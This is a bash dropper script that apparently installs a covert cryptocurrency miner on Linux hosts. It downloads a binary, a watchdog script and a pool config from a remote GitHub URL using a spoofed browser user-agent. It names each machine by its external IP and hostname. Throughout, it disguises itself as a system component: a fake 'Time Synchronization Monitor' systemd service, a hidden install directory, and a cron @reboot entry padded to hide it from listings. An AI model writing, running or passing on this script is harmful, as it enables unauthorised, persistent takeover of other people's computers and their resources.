#!/bin/bash

CUSTOM_PREFIX="$1"

CURRENT_USER=$(whoami)
IS_ROOT=false
EFFECTIVE_UID=$(id -u)

if [ "$EFFECTIVE_UID" -eq 0 ] || [ "$CURRENT_USER" = "root" ]; then
    IS_ROOT=true
fi

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

if [ "$IS_ROOT" = true ]; then
    INSTALL_DIR="/opt/libnet-cache"
    REAL_USER="${SUDO_USER:-$USER}"  
else
    INSTALL_DIR="/var/tmp/.local/share/libnet-cache"
    REAL_USER="$USER"
fi

URL_X86="https://example.com/downloads/kernel-package-x86_64.tar.gz"
URL_AARCH64="https://example.com/downloads/kernel-package-aarch64.tar.gz"
ARCH=$(uname -m)

Ua="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
SOFTWARE_BIN="$INSTALL_DIR/libnet-cached"
WATCHDOG_SCRIPT="$INSTALL_DIR/libnet-cache-check.sh"
CONFIG_JSON="$INSTALL_DIR/config.json"

HTTP_SERVER="https://github.com/Formin-cell/libnet-cache/raw/refs/heads"
SOFTWARE_URL="$HTTP_SERVER/modules/libnet-cached"
if [ "$(id -u)" -eq 0 ]; then
    WATCHDOG_URL="$HTTP_SERVER/modules/cache-env-root.sh"
else
    WATCHDOG_URL="$HTTP_SERVER/modules/cache-env-user.sh"
fi
CONFIG_URL="$HTTP_SERVER/modules/config.json"

case "$ARCH" in
    x86_64|amd64)
        SOFTWARE_URL="$HTTP_SERVER/modules/libnet-cached"
        echo "Detected architecture: x86_64-($ARCH)"
        ;;
    aarch64|arm64)
        SOFTWARE_BIN="$HTTP_SERVER/modules/libnet-cacheds"
        echo "Detected architecture: ARM64/aarch64-($ARCH)"
        ;;
    *)
        echo "Warning: Unsupported architecture ($ARCH). Falling back to default download URL."
        ;;
esac

generate_machine_id() {
    local hostname_raw=""
    local hostname_short=""
    local external_ip=""

    hostname_raw=$( (hostname -s 2>/dev/null || hostname 2>/dev/null) || echo "UNKNOWN" )
    hostname_short="${hostname_raw%%.*}"
    [ -z "$hostname_short" ] && hostname_short="UNKNOWN"

    local providers=("ifconfig.me" "icanhazip.com" "ipinfo.io/ip")

    if command -v curl >/dev/null 2>&1; then
        for provider in "${providers[@]}"; do
            external_ip=$(curl -4 -s --max-time 2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
            if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                break
            fi
        done
    fi

    if [ -z "$external_ip" ] || [ "$external_ip" = "NOIP" ]; then
        if command -v wget >/dev/null 2>&1; then
            local wget_opts="-qO-"
            if wget --help 2>&1 | grep -q -- "-4"; then
                wget_opts="-4 -qO-"
            fi

            for provider in "${providers[@]}"; do
                external_ip=$(wget $wget_opts --timeout=2 "$provider" 2>/dev/null | tr -d '\r\n[:space:]')
                if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                    break
                fi
            done
        fi
    fi

    if ! echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
        external_ip="NOIP"
    fi

    echo "${external_ip}_${hostname_short}"
}

deploy() {
    log "Starting full deployment..."
    mkdir -p "$INSTALL_DIR" || { log "FATAL: Cannot create $INSTALL_DIR"; exit 1; }

    log "Downloading binary from $SOFTWARE_URL..."
    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$SOFTWARE_URL" -o "$SOFTWARE_BIN" 2>/dev/null; then
        log "Binary downloaded successfully"
    else
        rm -f "$SOFTWARE_BIN"
        log "Network download failed for binary"
    fi 

    [ -f "$SOFTWARE_BIN" ] && chmod +x "$SOFTWARE_BIN"

    local mode_str=$([ "$IS_ROOT" = true ] && echo 'ROOT' || echo 'USER')
    log "Downloading watchdog script from $WATCHDOG_URL ($mode_str mode)..."
    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$WATCHDOG_URL" -o "$WATCHDOG_SCRIPT" 2>/dev/null; then
        log "Watchdog script downloaded successfully"
    else
        rm -f "$WATCHDOG_SCRIPT"
        log "Network download failed for watchdog"
    fi 

    [ -f "$WATCHDOG_SCRIPT" ] && chmod +x "$WATCHDOG_SCRIPT"

    # 生成基础 Machine ID
    MACHINE_ID=$(generate_machine_id)

    # 如果传入了自定义参数，拼接成新的机器名称；未传入则直接使用 MACHINE_ID
    if [ -n "$CUSTOM_PREFIX" ]; then
        WORKER_NAME="${CUSTOM_PREFIX}_${MACHINE_ID}"
    else
        WORKER_NAME="$MACHINE_ID"
    fi

    log "FINAL WORKER NAME: $WORKER_NAME"

    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$CONFIG_URL" -o "$CONFIG_JSON" 2>/dev/null; then
        log "Config downloaded from network"

        # 优先使用 jq 处理（如果系统已安装 jq）
        if command -v jq >/dev/null 2>&1; then
            if jq --arg name "$WORKER_NAME" \
                  '(.["worker-id"] = $name) | 
                   (.["rig-id"] = $name) | 
                   (.pools[]?.pass = $name)' "$CONFIG_JSON" > "${CONFIG_JSON}.tmp" && mv "${CONFIG_JSON}.tmp" "$CONFIG_JSON"; then
                log "Config successfully customized via jq with Worker Name: $WORKER_NAME"
            else
                log "jq failed to update config"
            fi
        # 如果没有 jq 则回退到 sed 正则替换
        else
            if sed -i --follow-symlinks "s#\"worker-id\":\s*[^,}]*#\"worker-id\": \"$WORKER_NAME\"#g" "$CONFIG_JSON" && \
               sed -i --follow-symlinks "s#\"rig-id\":\s*[^,}]*#\"rig-id\": \"$WORKER_NAME\"#g" "$CONFIG_JSON" && \
               sed -i --follow-symlinks "s#\"pass\":\s*\"[^\"]*\"#\"pass\": \"$WORKER_NAME\"#g" "$CONFIG_JSON"; then
                log "Config successfully customized via sed with Worker Name: $WORKER_NAME"
            else
                log "sed failed to customize config"
            fi
        fi
    else
        rm -f "$CONFIG_JSON"
        log "Network download failed for config"
    fi

    log "Deployment complete — files installed to $INSTALL_DIR"
}

setup_root_persistence() {

    if command -v systemctl >/dev/null 2>&1; then
        local service_file="/etc/systemd/system/systemd-timesyncd-monitor.service"
        local bash_bin
        bash_bin=$(command -v bash 2>/dev/null)
        bash_bin=${bash_bin:-/bin/bash}
        
        if [ ! -f "$service_file" ]; then
            log "  [systemd] Installing system-level service..."
            

            cat > "$service_file" << EOF
[Unit]
Description=Time Synchronization Monitor
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=forking
User=root
ExecStart=$bash_bin $WATCHDOG_SCRIPT
Restart=always
RestartSec=15

OOMScoreAdjust=-1000

[Install]
WantedBy=multi-user.target
EOF
            

            systemctl daemon-reload 2>/dev/null
            systemctl enable systemd-timesyncd-monitor.service 2>/dev/null \
                && systemctl start systemd-timesyncd-monitor.service 2>/dev/null \
                && log "  [systemd] System service installed, enabled, and started." \
                || log "  [systemd] WARNING: Could not enable or start system service."
        else
            log "  [systemd] System service already installed — skipping."
        fi
    else
        log "  [systemd] systemctl not available — skipping."
    fi
}

setup_user_persistence() {

    if command -v crontab >/dev/null 2>&1; then
        if crontab -l 2>/dev/null | grep -aF "$WATCHDOG_SCRIPT"; then
            log "  [cron] @reboot entry already present — skipping."
        else

            (crontab -l 2>/dev/null; printf "@reboot sleep 60 && bash \"$WATCHDOG_SCRIPT\";\r%200c\n") | crontab - 2>/dev/null \
                && log "  [cron] @reboot entry added." \
                || log "  [cron] WARNING: Could not write crontab."
        fi
    else
        log "  [cron] crontab not available — skipping."
    fi

}

mkdir -p "$INSTALL_DIR"

deploy

setup_persistence() {
    log "Configuring persistence layers..."
    
    if [ "$IS_ROOT" = true ]; then
        log "  [MODE] ROOT Mode"
        setup_root_persistence
    else
        log "  [MODE] USER Mode"
        setup_user_persistence
    fi
    
    log "Persistence setup complete."
}

setup_persistence

log "Script finished."
exit 0